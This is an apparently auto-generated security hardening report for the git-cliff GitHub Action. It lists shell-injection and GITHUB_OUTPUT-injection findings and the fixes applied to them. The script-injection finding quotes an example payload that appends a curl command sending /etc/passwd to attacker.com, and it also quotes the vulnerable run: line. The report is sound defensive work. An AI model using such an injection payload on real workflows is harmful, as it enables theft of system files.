<!-- markdownlint-disable -->

# Hardening Report: orhun--git-cliff-action/v4.6.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **orhun--git-cliff-action/v4.6.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Two GitHub Actions expressions are directly interpolated into a `run:` shell command string in the 'Run git-cliff' step: `${{ inputs.config }}` and `${{ inputs.args }}`. Both are user-supplied inputs that flow through YAML template substitution before the shell ever sees them, allowing an attacker to inject arbitrary shell commands. For example, an `args` value of `; curl -d @/etc/passwd attacker.com` would execute as a shell command. These values must be passed via `env:` variables and then referenced as quoted shell variables (e.g., `"$ARGS"`) instead of being interpolated directly. Offending line: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`

Locations:

- `action.yml:45`

### github-env-injection (severity: high)

In run.sh, the `$OUTPUT` variable — which is derived from the user-controlled `inputs.args` input (via `--output=` argument parsing) — is written to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). This allows an attacker to inject arbitrary key=value pairs into the GitHub Actions output environment by supplying a newline in the output path. Affected writes: (1) `echo "content<<EOF" >> $GITHUB_OUTPUT` / `cat "$OUTPUT" >> $GITHUB_OUTPUT` — file content at a user-controlled path is streamed directly into GITHUB_OUTPUT; (2) `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` — the unsanitized user-controlled path is written as an output value. Both writes must be preceded by sanitizing the value with `printf '%s' "$OUTPUT" | tr -d '\n\r'`.

Locations:

- `run.sh:55`
- `run.sh:58`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:46`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:46`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, github-env-injection

**Notes:**

Fixed three categories of findings:
1. action.yml (script-injection / static-inline-injection): Moved `${{ inputs.config }}` and `${{ inputs.args }}` out of the `run:` shell string into the `env:` block as `GIT_CLIFF_CONFIG` and `GIT_CLIFF_ARGS`. The run: block now uses xargs-based quote-aware tokenization to build an args array, preventing shell injection.
2. run.sh (github-env-injection): Added `SAFE_OUTPUT="$(printf '%s' "$OUTPUT" | tr -d '\n\r')"` to sanitize the user-controlled output path before writing to $GITHUB_OUTPUT. All GITHUB_OUTPUT writes now use the sanitized $SAFE_OUTPUT variable instead of the raw $OUTPUT.

